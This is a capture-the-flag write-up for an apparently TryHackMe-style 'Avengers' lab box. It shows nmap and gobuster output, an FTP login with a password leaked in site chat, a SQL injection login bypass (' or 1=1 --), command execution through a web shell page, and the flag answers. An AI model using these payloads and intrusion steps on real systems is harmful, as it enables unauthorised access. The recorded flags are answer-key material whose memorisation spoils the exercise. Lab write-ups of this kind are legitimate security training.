nmap scan
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS -Pn -sV 10.10.114.120
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 14:56 PDT
Nmap scan report for 10.10.114.120
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.20 seconds
                                                              
```


Task 2 - cookies
1) On the deployed Avengers machine you recently deployed, get the flag1 cookie value.
* `cookie_secrets`

I found 2 cookies: `flag1` and `connect.sid`

Task 3 - HTTP Headers

1) Look at the HTTP response headers and obtain flag 2.
* `headers_are_important`

Task 4 - Enumeration and FTP

Anonymous ftp is not allowed, so I need some creds. After reading the chat thread on the site, I have found
`Groot asks if someone can reset his password. He said the last one he can remember is iamgroot?`.

So let's try `groot:iamgroot` in ftp and ssh.

ftp -> SUCCESS!
```
└─$ ftp
ftp> open 10.10.114.120
Connected to 10.10.114.120.
220 (vsFTPd 3.0.3)
Name (10.10.114.120:gomez22): groot
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45969|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||40732|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 .
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||40086|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 04  2019 .
dr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..
-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt

```
I found flag3.txt so I downloaded it to my machine.
```
ftp> get flag3.txt
local: flag3.txt remote: flag3.txt
229 Entering Extended Passive Mode (|||48281|)
150 Opening BINARY mode data connection for flag3.txt (33 bytes).
100% |********************************|    33        5.29 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.19 KiB/s)

```

1) Look around the FTP share and read flag 3!
*`8fc651a739befc58d450dc48e1f1fd2e`


Task 5 - GoBuster
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt -u 10.10.114.120
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.120
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,js,txt
[+] Timeout:                 10s
===============================================================
2022/07/14 15:11:41 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Home                 (Status: 302) [Size: 23] [--> /]        
/home                 (Status: 302) [Size: 23] [--> /]        
/img                  (Status: 301) [Size: 173] [--> /img/]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/logout               (Status: 302) [Size: 29] [--> /portal]  
/portal               (Status: 200) [Size: 1409] 
```
1) What is the directory that has an Avengers login?
* `/portal`

Task 6 - SQL Injection
1) Log into the Avengers site. View the page source, how many lines of code are there?
I used `' or 1=1 --` in both the password and username fields and was able to login.
* `223`

Task 7 - Remote Code Execution and Linux

I am now on a page where I can enter shell commands. I will navigate the system to find flag5.txt.
```
###############
ls

create.sql
node_modules
package-lock.json
package.json
server.js
views
##############
cd /home; ls

groot
ubuntu
##############
cd /home/ubuntu; ls

avengers
flag5.txt
```

After trying a few ways to read `flag5.txt` I finally found the correct one: `nl /home/ubuntu/flag5.txt`
1) Read the contents of flag5.txt
* `d335e2d13f36558ba1e67969a1718af7`
